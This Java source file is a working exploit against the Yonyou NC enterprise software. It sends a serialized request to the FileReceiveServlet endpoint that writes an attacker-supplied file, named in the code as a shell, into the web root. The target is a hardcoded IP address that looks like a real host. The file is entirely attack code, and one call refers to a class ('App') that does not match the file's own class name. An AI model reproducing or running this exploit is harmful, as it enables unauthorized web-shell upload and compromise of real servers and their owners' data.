import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

class YonyouNC {
    public static  void main(String[] args) throws Exception {
        String url="http://111.47.24.121:8081/";
        String endpoint = "/servlet/FileReceiveServlet";
        String web_path = "webapps/nc_web";
        String upload_file_name = "test.txt";
        String shell_path = "/tmp/t.txt";

        Map<String, Object> metaInfo= new HashMap<>();
        metaInfo.put("TARGET_FILE_PATH",web_path.replaceFirst("^/",""));
        metaInfo.put("FILE_NAME",upload_file_name.replaceFirst("^/",""));
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(metaInfo);
        InputStream in = new FileInputStream(shell_path);
        byte[] buf=new byte[1024];
        int len=0;
        while ((len=in.read(buf))!=-1){
            baos.write(buf,0,len);
        }
        byte[] body = baos.toByteArray();
        URL u = new URL(url + endpoint);
        HttpURLConnection connection = (HttpURLConnection) u.openConnection();
        connection.setRequestMethod("POST");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);
        connection.setRequestProperty("Content-Type",
                "multipart/form-data;");
        connection.setRequestProperty("Referer",
                url);
        connection.setRequestProperty("Content-Length",
                Integer.toString(body.length));

        connection.setUseCaches(false);
        connection.setDoOutput(true);

        //Send request
        DataOutputStream wr = new DataOutputStream (
                connection.getOutputStream());
        wr.write(body);
        wr.close();
        System.out.println(url + upload_file_name.replaceFirst("^/",""));
        System.out.println(App.getFullResponse(connection));
        connection.disconnect();
    }
        public static String getFullResponse(HttpURLConnection con) throws IOException {
            StringBuilder fullResponseBuilder = new StringBuilder();

            // read status and message
            fullResponseBuilder.append(con.getResponseCode())
                    .append(" ")
                    .append(con.getResponseMessage())
                    .append("\n");
            // read headers
            con.getHeaderFields().entrySet().stream()
                    .filter(entry -> entry.getKey() != null)
                    .forEach(entry -> {
                        fullResponseBuilder.append(entry.getKey()).append(": ");
                        List<String> headerValues = entry.getValue();
                        Iterator<String> it = headerValues.iterator();
                        if (it.hasNext()) {
                            fullResponseBuilder.append(it.next());
                            while (it.hasNext()) {
                                fullResponseBuilder.append(", ").append(it.next());
                            }
                        }
                        fullResponseBuilder.append("\n");
                    });
            fullResponseBuilder.append("\n");
            // read response content
            Reader streamReader;
            if (con.getResponseCode() >= 400) {
//                streamReader = new InputStreamReader(con.getErrorStream());
//                streamReader = new InputStreamReader(con.getOutputStream());
                return fullResponseBuilder.toString();
            } else {
                streamReader = new InputStreamReader(con.getInputStream());
            }
            BufferedReader in = new BufferedReader(streamReader);
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                fullResponseBuilder.append(inputLine);
            }
            in.close();
            return fullResponseBuilder.toString();
        }
}
